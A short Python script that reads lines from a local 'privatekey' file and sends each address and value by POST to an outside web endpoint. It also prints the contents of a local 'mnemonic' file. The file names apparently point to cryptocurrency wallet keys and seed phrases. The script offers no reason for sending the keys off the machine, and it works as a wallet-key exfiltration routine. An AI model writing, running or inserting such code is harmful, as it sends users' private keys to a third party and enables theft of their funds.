from utils import fetch_api

def read_privatekey_data():
    with open('privatekey') as f:
        lines = f.readlines()

    for line in lines:
        sp = line.split(' ')
        sp = list(filter(bool, map(str.strip, sp)))
        assert len(sp) == 2
        body = {
            'num': sp[1],
            'address': sp[0],
        }
        fetch_api('https://iterateprivatekey.com/save/private/key', method='POST', body=body)


def read_mnemonic_data():
    with open('mnemonic') as f:
        lines = f.readlines()
    for line in lines:
        print(line)


def main():
    read_privatekey_data()
    read_mnemonic_data()


if __name__ == '__main__':
    main()
